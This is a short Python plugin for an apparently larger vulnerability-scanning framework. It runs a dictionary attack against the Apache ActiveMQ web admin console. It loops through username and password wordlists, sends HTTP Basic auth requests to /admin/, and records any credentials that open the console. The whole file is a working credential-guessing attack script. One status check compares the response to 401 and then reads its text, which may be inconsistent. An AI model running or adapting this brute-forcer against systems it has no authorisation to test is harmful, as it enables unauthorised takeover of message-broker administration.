#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from base64 import b64encode
from script import Script, SERVER_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.server_type = SERVER_PORT_MAP.ACTIVEMQ
        self.name = 'activemq burst'
        self.keyword = ['web', 'activemq', 'burst']
        self.info = 'Burst activemq weakpass.'
        self.type = 'weakpass'
        self.level = 'high'
        Script.__init__(self, target=target, server_type=self.server_type)

    def prove(self):
        self.get_url()
        if self.base_url:
            usernamedic = self.read_file(self.parameter['U']) if 'U' in self.parameter.keys() else self.read_file('dict/activemq_usernames.txt')
            passworddic = self.read_file(self.parameter['P']) if 'P' in self.parameter.keys() else self.read_file('dict/activemq_passwords.txt')
            url = self.base_url + "admin/"
            res = self.curl('get', url)
            if res == 401 :
                for linef1 in usernamedic:
                    username = linef1.strip('\r').strip('\n')
                    for linef2 in passworddic:
                        try:
                            password = (
                                linef2 if '%user%' not in linef2 else str(linef2).replace("%user%", str(username))).strip(
                                '\r').strip('\n')
                            key = str(b64encode(bytes(":".join([username, password]), 'utf-8')),'utf-8')
                            headers = {"Authorization":  'Basic %s' % key}
                            res = self.curl('get',url,headers = headers)
                            if 'Console' in res.text:
                                self.flag = 1
                                self.req.append({"username": username,"password":password})
                                self.res.append({"info": username + "/" + password, "key": "Authorization: " + ":".join([username, password])})
                                return
                        except Exception:
                            pass